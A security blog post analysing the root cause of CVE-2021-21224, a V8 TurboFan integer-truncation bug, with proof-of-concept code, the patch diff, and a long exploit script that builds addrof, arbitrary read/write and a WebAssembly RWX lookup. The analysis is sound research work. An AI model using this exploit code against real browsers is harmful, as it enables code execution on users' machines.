<!doctype html><html lang=en>
<head><title>
Root Cause Analysis of CVE-2021-21224 &ndash; Anvbis
</title>
<meta name=description content>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis@anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:contact@anvbis.au rel=me aria-label=Email title=Email><i class="fa fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</header>
<section class=page__body>
<header class=content__header>
<h1>Root Cause Analysis of CVE-2021-21224</h1>
</header>
<div class=content__body>
<h2 id=overview>Overview</h2>
<p>An incorrect optimization in TurboFan&rsquo;s representation changer results in Int64 values being erroneously truncated to Int32 values.</p>
<p>I figured this bug would be a great way to further explore TurboFan&rsquo;s simplified lowering phase, and learn more about representation change internals.</p>
<p>You can find the relevant chromium bug report <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">here</a>.</p>
<h2 id=proof-of-concept>Proof of Concept</h2>
<p>Below is the proof-of-concept that was provided in the original issue. I&rsquo;ve reformatted it a little in order to make it a bit more readable, but the code is the same.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* supplied_poc.js */</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>y</span> <span style=color:#f92672>=</span> (<span style=color:#66d9ef>new</span> Date(<span style=color:#ae81ff>42</span>)).<span style=color:#a6e22e>getMilliseconds</span>();

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;

  <span style=color:#66d9ef>return</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#a6e22e>y</span>, <span style=color:#a6e22e>i</span>, <span style=color:#ae81ff>1</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>y</span>) <span style=color:#f92672>&gt;</span> <span style=color:#a6e22e>y</span>;
}

<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>)); <span style=color:#75715e>/* true */</span>

<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>)); <span style=color:#75715e>/* false */</span>
</code></pre></div><p>In the process of investigating this bug, I also managed to produce this much simpler proof-of-concept. This is what I&rsquo;ll be using for further analysis - at the very least, a simpler PoC means a simpler Turbolizer graph.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#75715e>/* simplified_poc.js */</span>

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>1337</span>, <span style=color:#a6e22e>i</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>z</span>;
}

<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>)); <span style=color:#75715e>/* -4294967295 */</span>

<span style=color:#f92672>%</span><span style=color:#a6e22e>PrepareFunctionForOptimization</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>);

<span style=color:#f92672>%</span><span style=color:#a6e22e>OptimizeFunctionOnNextCall</span>(<span style=color:#a6e22e>foo</span>);
<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>)); <span style=color:#75715e>/* 1 */</span>
</code></pre></div><p>What I find particularly interesting about this simplified proof-of-concept is that it doesn&rsquo;t use the left shift operator - while the original bug report states the following:</p>
<blockquote>
<p>The following PoC generates a V8 incorrect optimization of [the] left shift operator, which leads to [the] optimized function return value to be different than [the] unoptimized function return value.</p>
</blockquote>
<p>My initial assumption is that bug is actually due to an incorrect optimization in the comparison operator (as TurboFan effectively optimizes the <code>Math.max()</code> call to an <code>Int64LessThan</code> node) rather than an incorrect optimization in the left shift operator.</p>
<p>While I might be completely wrong, it&rsquo;s definitely a topic that requires further investigation.</p>
<h2 id=patch-implementation-details>Patch Implementation Details</h2>
<p>Starting by just looking at the comment provided with the patch, the vulnerability appears to be a logic bug in <code>GetWord32RepresentationFor</code>. There&rsquo;s also mention of respecting the TypeCheckKind, though I&rsquo;m not sure what this means just yet.</p>
<pre><code>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
We have to respect the TypeCheckKind.
</code></pre><p>Looking at a diff of the patch itself, we can see that the bug occurs when converting a 64-bit integer to a 32-bit integer in the SimplifiedLowering phase.</p>
<p>The author seems to have added only a single new check, ensuring that the TypeCheckKind is kNone when the output type is Unsigned32.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff>diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
index 64b274c..3d937ad 100644
<span style=color:#f92672>--- a/src/compiler/representation-change.cc
</span><span style=color:#f92672></span><span style=color:#a6e22e>+++ b/src/compiler/representation-change.cc
</span><span style=color:#a6e22e></span><span style=color:#75715e>@@ -949,10 +949,10 @@
</span><span style=color:#75715e></span>     return node;
   } else if (output_rep == MachineRepresentation::kWord64) {
     if (output_type.Is(Type::Signed32()) ||
<span style=color:#f92672>-        output_type.Is(Type::Unsigned32())) {
</span><span style=color:#f92672>-      op = machine()-&gt;TruncateInt64ToInt32();
</span><span style=color:#f92672>-    } else if (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span style=color:#f92672>-               use_info.truncation().IsUsedAsWord32()) {
</span><span style=color:#f92672></span><span style=color:#a6e22e>+        (output_type.Is(Type::Unsigned32()) &amp;&amp;
</span><span style=color:#a6e22e>+         use_info.type_check() == TypeCheckKind::kNone) ||
</span><span style=color:#a6e22e>+        (output_type.Is(cache_-&gt;kSafeInteger) &amp;&amp;
</span><span style=color:#a6e22e>+         use_info.truncation().IsUsedAsWord32())) {
</span><span style=color:#a6e22e></span>       op = machine()-&gt;TruncateInt64ToInt32();
     } else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
                use_info.type_check() == TypeCheckKind::kSigned32 ||
</code></pre></div><p>So what happens if the TypeCheckKind is kSigned32, rather than kNone? I suspect that prior to the patch, TurboFan would erroneously truncate the Unsigned32 value to a Signed32 integer. I&rsquo;ll need to make some modifications to the patch in order to test this.</p>
<p>In the code snippet below I&rsquo;ve just edited out irrelevant code to see the control flow after the patch.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>Node<span style=color:#f92672>*</span> RepresentationChanger<span style=color:#f92672>::</span>GetWord32RepresentationFor(
  <span style=color:#66d9ef>const</span> Operator<span style=color:#f92672>*</span> op <span style=color:#f92672>=</span> <span style=color:#66d9ef>nullptr</span>;  

  <span style=color:#75715e>/* ... */</span>

  } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (output_rep <span style=color:#f92672>==</span> MachineRepresentation<span style=color:#f92672>::</span>kWord64) {
    <span style=color:#75715e>/* ... */</span>
    } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (<span style=color:#75715e>/* ... */</span>
        output_type.Is(Type<span style=color:#f92672>::</span>Unsigned32()) <span style=color:#f92672>&amp;&amp;</span>
        use_info.type_check() <span style=color:#f92672>==</span> TypeCheckKind<span style=color:#f92672>::</span>kNone <span style=color:#75715e>/* ... */</span>) {
      op <span style=color:#f92672>=</span> machine()<span style=color:#f92672>-&gt;</span>TruncateInt64ToInt32();
    } 
    <span style=color:#75715e>/* ... */</span>
  }

  <span style=color:#75715e>/* ... */</span>

  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>InsertConversion</span>(node, op, use_node);
}
</code></pre></div><p>Now that I have a bit more insight into the patch itself, there are still some questions that will hopefully be answered when looking at Turbolizer graphs:</p>
<ol>
<li>Why does the value need to be converted into a Word32 representation in the first place?</li>
<li>How can we leverage this signed/unsigned integer confusion to gain code execution?</li>
</ol>
<h1 id=turbolizer-graph-comparison>Turbolizer Graph Comparison</h1>
<p>I&rsquo;ve generated a Turbolizer graph for the PoC both prior to the patch, and after the patch was applied.</p>
<p>In this first Turbolizer graph (pre-patch), we can see that TurboFan assumes our input value has a range of (-1, 4294967295). This Float64 value is then converted to an Int64 for comparison, as the <code>Math.max</code> call was lowered to an Int64LessThan node.</p>
<p>The result of this is then converted to a 32-bit signed integer via the TruncateInt64ToInt32 node.</p>
<figure><img src=/img/20221206/turbolizer-1.png alt=turbolizer-1.png><figcaption>
<p>Figure 1: Vulnerable turbolizer graph.</p>
</figcaption>
</figure>
<p>The post-patch Turbolizer graph starts off very similarly to the pre-patch graph. However, rather than converting the output of <code>Math.max</code> via a TruncateInt64ToInt32 node, we see a CheckedUint64ToInt32 node.</p>
<p>In this post-patch graph we can see that TurboFan has now correctly identified that the input was an unsigned value (that needed to be used in a signed operation), before converting it to a 32-bit integer.</p>
<figure><img src=/img/20221206/turbolizer-2.png alt=turbolizer-2.png><figcaption>
<p>Figure 2: Patched turbolizer graph.</p>
</figcaption>
</figure>
<p>In our case, as <code>use_info.type_check()</code> is kSigned32 rather than kNone, we fail the added check.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>    } <span style=color:#66d9ef>else</span> <span style=color:#a6e22e>if</span> (<span style=color:#75715e>/* ... */</span>
        output_type.Is(Type<span style=color:#f92672>::</span>Unsigned32()) <span style=color:#f92672>&amp;&amp;</span>
        use_info.type_check() <span style=color:#f92672>==</span> TypeCheckKind<span style=color:#f92672>::</span>kNone <span style=color:#75715e>/* ... */</span>) {
</code></pre></div><p>Instead, our input is passed on to the following code that checks whether the output is a kPositiveSafeInteger, which it is, before being converted to a <code>CheckedUint64ToInt32</code> node, rather than a <code>TruncateInt64ToInt32</code> node.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>      <span style=color:#66d9ef>if</span> (output_type.Is(cache_<span style=color:#f92672>-&gt;</span>kPositiveSafeInteger)) {
        op <span style=color:#f92672>=</span> simplified()<span style=color:#f92672>-&gt;</span>CheckedUint64ToInt32(use_info.feedback());
</code></pre></div><h1 id=exploitability>Exploitability</h1>
<p>As this is bug was discovered prior to <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1198696">this patch</a>, we can use the <code>Array.prototype.shift</code> trick to create an array with a length of <code>-1</code>.</p>
<p>This gives us out-of-bounds read/write access below the array&rsquo;s element store. In the code snippet below, I use this to corrupt another array&rsquo;s length value, giving very stable out-of-bounds access.</p>
<p>From this point it&rsquo;s a trivial exercise to build exploit primitives and gain code execution.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>x</span>);
  <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>z</span>; 
  <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>sign</span>(<span style=color:#a6e22e>z</span>);

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cor</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#a6e22e>z</span>);
  <span style=color:#a6e22e>cor</span>.<span style=color:#a6e22e>shift</span>();

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>oob</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
  <span style=color:#66d9ef>return</span> { <span style=color:#a6e22e>cor</span>, <span style=color:#a6e22e>oob</span> };
}

<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
  <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>);

<span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>cor</span>, <span style=color:#a6e22e>oob</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>);
<span style=color:#a6e22e>cor</span>[<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span>;
</code></pre></div><p>I&rsquo;ve written and attached an entire exploit for this CVE below.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>bs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#ae81ff>8</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Float64Array</span>(<span style=color:#a6e22e>bs</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>is</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BigUint64Array</span>(<span style=color:#a6e22e>bs</span>);

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>ftoi</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span> =&gt; {
  <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>];
}

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>itof</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span> =&gt; {
  <span style=color:#a6e22e>is</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>;
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>fs</span>[<span style=color:#ae81ff>0</span>];
}

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>foo</span>(<span style=color:#a6e22e>a</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffffff</span>;
  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>a</span>) <span style=color:#a6e22e>x</span> <span style=color:#f92672>=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>max</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>x</span>);
  <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>-</span> <span style=color:#a6e22e>z</span>; 
  <span style=color:#a6e22e>z</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>sign</span>(<span style=color:#a6e22e>z</span>);

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>cor</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Array(<span style=color:#a6e22e>z</span>);
  <span style=color:#a6e22e>cor</span>.<span style=color:#a6e22e>shift</span>();

  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>oob</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>, <span style=color:#ae81ff>2.2</span>, <span style=color:#ae81ff>3.3</span>];
  <span style=color:#66d9ef>return</span> { <span style=color:#a6e22e>cor</span>, <span style=color:#a6e22e>oob</span> };
}

<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100000</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
  <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>true</span>);

<span style=color:#66d9ef>let</span> { <span style=color:#a6e22e>cor</span>, <span style=color:#a6e22e>oob</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>foo</span>(<span style=color:#66d9ef>false</span>);
<span style=color:#a6e22e>cor</span>[<span style=color:#ae81ff>16</span>] <span style=color:#f92672>=</span> <span style=color:#ae81ff>1337</span>;

<span style=color:#75715e>/* flt.elements @ oob[10] (upper) */</span>
<span style=color:#75715e>/* obj.elements @ oob[22] (upper) */</span>
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>flt</span> <span style=color:#f92672>=</span> [<span style=color:#ae81ff>1.1</span>];
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>tmp</span> <span style=color:#f92672>=</span> {<span style=color:#a6e22e>a</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>};
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>obj</span> <span style=color:#f92672>=</span> [<span style=color:#a6e22e>tmp</span>];

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>o</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>22</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>;
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>b</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>((<span style=color:#a6e22e>a</span> <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>b</span>);
  <span style=color:#a6e22e>obj</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>o</span>;
  <span style=color:#66d9ef>return</span> (<span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>;
}

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>p</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(((<span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>a</span>);
  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>]);
}

<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>p</span>, <span style=color:#a6e22e>x</span>) {
  <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>a</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ftoi</span>(<span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span><span style=color:#a6e22e>n</span>;
  <span style=color:#a6e22e>oob</span>[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(((<span style=color:#a6e22e>p</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>8</span><span style=color:#a6e22e>n</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#a6e22e>n</span>) <span style=color:#f92672>+</span> <span style=color:#a6e22e>a</span>);
  <span style=color:#a6e22e>flt</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>itof</span>(<span style=color:#a6e22e>x</span>);
}

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>wasm</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x73</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x85</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x60</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x7f</span>, <span style=color:#ae81ff>0x03</span>, <span style=color:#ae81ff>0x82</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x70</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x05</span>, <span style=color:#ae81ff>0x83</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x81</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0x91</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x06</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x65</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x6f</span>,
  <span style=color:#ae81ff>0x72</span>, <span style=color:#ae81ff>0x79</span>, <span style=color:#ae81ff>0x02</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x04</span>, <span style=color:#ae81ff>0x6d</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x69</span>, <span style=color:#ae81ff>0x6e</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x0a</span>, <span style=color:#ae81ff>0x8a</span>,
  <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x01</span>, <span style=color:#ae81ff>0x84</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x2a</span>,
  <span style=color:#ae81ff>0x0b</span>
]);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>module</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Module</span>(<span style=color:#a6e22e>wasm</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>instance</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebAssembly</span>.<span style=color:#a6e22e>Instance</span>(<span style=color:#a6e22e>module</span>);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>rwx</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>read</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>instance</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x68</span><span style=color:#a6e22e>n</span>);

<span style=color:#75715e>/* DISPLAY=&#39;:0.0&#39; xcalc */</span> 
